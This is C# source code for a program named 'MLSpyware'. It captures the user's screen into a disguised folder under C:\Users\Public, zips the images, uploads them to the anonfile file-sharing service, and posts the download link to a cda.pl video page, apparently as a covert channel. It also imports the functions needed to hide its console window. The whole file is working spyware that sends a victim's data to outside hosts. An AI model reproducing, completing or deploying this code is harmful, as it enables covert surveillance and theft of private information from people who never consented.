using System;
using System.Collections.Generic;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Runtime.InteropServices;
using System.IO.Compression;
using System.Net;
using System.Xml.Linq;
using System.Xml.XPath;
using System.Runtime.Serialization.Json;

namespace MLSpyware
{
    internal class Program
    {
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        const int SW_HIDE = 0;
        const int SW_SHOW = 5;
        private static string path = @"C:\Users\Public\WindowsX32";
        private static string zipath = @"C:\Users\Public\result.zip";
        private static int _timespan = 3000;
        private static string cdapath = "11016028bf";
        private static readonly WebClient _client = new WebClient();
        private static string key = "SOZels7lsJ9hrEEYkYoO04S7OOYNG1kuGcxECU3idwyGF42UiR";
        static async Task Main(string[] args)
        {

            DirectoryInfo dir = new DirectoryInfo(path);
            Spy ps = new Spy(); 
            if (dir.Exists == false) dir.Create();

            //while (true)
            {
                StartPrinting(ps);
                DirectoryInfo zipdir = new DirectoryInfo(path);
                if (zipdir.Exists == false) 
                    ZipFile.CreateFromDirectory(path, zipath);
                string anonfileurl = UploadFile(@"C:\Users\Public\result.zip");
                int anonlen = 50 - anonfileurl.Length;
                for (int i = 0; i < anonlen; i++)
                {
                    anonfileurl = anonfileurl + "*";
                }
                Sender test = new Sender(anonfileurl, key);
                var res = await test.sendtoCDA($"https://www.cda.pl/video/{cdapath}");
                
            }
            File.Delete(path);
            File.Delete(zipath);
        }
        private static string ParseOutput(string input)
        {
            using (var jsonReader = JsonReaderWriterFactory.CreateJsonReader(Encoding.UTF8.GetBytes(input),
                new System.Xml.XmlDictionaryReaderQuotas()))
            {
                var root = XElement.Load(jsonReader);
                bool status = Convert.ToBoolean(root.XPathSelectElement("//status")?.Value);

                if (!status)
                { 
                    return null;
                }
                else
                {
                    string urlfull = root.XPathSelectElement("//url/full")?.Value;
                    return urlfull;
                }
            }
        }
        public static string UploadFile(string fileLocation)
        {
            byte[] response = _client.UploadFile("https://api.anonfile.com/upload", fileLocation);

            return ParseOutput(Encoding.Default.GetString(response));
        }
        private static void StartPrinting(Spy ps)
        {
            var name = DateTime.Now.ToString("yyyyMMddhhmmss");
            ps.CaptureScreenToFile($"{path}\\{name}.png", ImageFormat.Png);
            Console.WriteLine($"Printed {name}");
        }
    }
}
